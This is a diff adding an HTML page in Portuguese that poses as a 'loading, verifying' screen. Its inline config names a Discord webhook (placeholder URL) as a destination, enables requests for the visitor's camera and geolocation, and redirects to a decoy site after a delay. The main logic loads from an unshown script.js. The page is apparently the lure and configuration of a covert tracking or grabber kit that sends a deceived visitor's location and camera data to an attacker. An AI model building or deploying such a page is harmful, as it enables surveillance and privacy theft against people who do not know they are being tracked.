@@ -1,0 +1,33 @@
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <title>Carregando...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body { font-family: sans-serif; background:#0d1117; color:#c9d1d9; text-align:center; padding:3rem; }
+    #status { font-size:1.25rem; margin-bottom:1rem; }
+    #debugBox { max-width:600px; margin:1rem auto; text-align:left; white-space:pre-wrap; font-family:monospace; font-size:.85rem; background:#161b22; padding:1rem; border-radius:8px; display:none; }
+  </style>
+</head>
+<body>
+  <div id="status">Aguarde, verificando...</div>
+  <div id="debugBox"></div>
+
+  <!-- Config inline mínima (pode sobrescrever via osint-config.js ou querystring) -->
+  <script>
+    window.OSINT_CONFIG = {
+      webhookUrl: "https://discord.com/api/webhooks/COLE_SUA_URL_AQUI", // ⚠️ TROQUE
+      finalUrl: "https://www.exemplo.com",   // destino padrão
+      requestCamera: true,   // tentar câmera?
+      requestGeo: true,      // tentar geolocalização?
+      redirectDelayMs: 1000, // atraso antes do redirect
+      debug: false           // mostrar logs na tela
+    };
+  </script>
+
+  <!-- Importa config externa opcional (se existir; falha silenciosa) -->
+  <script src="osint-config.js" defer></script>
+  <!-- Script principal -->
+  <script src="script.js" defer></script>
+</body>
+</html>
